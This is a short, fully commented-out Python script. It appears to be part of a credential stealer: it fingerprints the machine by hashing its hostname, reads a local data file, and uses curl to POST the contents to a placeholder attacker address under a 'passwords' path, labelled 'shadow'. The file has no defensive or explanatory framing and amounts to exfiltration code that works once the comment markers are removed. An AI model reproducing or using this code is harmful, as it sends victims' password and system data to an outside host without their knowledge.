# import socket
# import hashlib
# import os
# import json
# from subprocess import Popen, PIPE, STDOUT
# from base64 import b64encode

# # target address
# target_ip = "<REPLACE_IP>"
# target_port = 10000
# target_passwd_path = "passwords"

# # get current pwd
# current_dir = os.getcwd()

# def send_data(raw_data, unique_id, path, kind):
#     url = f"http://{target_ip}:{target_port}/{path}"
#     data = {"uuid": unique_id, "data": raw_data, "kind": kind}

#     # Using popen with curl instead of requests to avoid dependencies and requiring pyinstaller
#     result = Popen(["curl", "-X", "POST", "-H", "Content-Type: application/json", "-d", json.dumps(data), url], stdout=PIPE, stderr=STDOUT)
#     result.wait()

# def generate_uuid():
#     """
#     Generate a unique id for the computer by taking the MD5 hash of its hostname.

#     Returns:
#         str: The unique id as a 32-character hexadecimal string.
#     """
#     computer_id = socket.gethostname()
#     hash_object = hashlib.md5(computer_id.encode())
#     unique_id = hash_object.hexdigest()
#     return unique_id

# # generate uuid
# unique_id = generate_uuid()

# with open(f"{current_dir}/data.txt", "r") as f:
#     data = f.read()


# send_data(data, unique_id, target_passwd_path, "shadow")



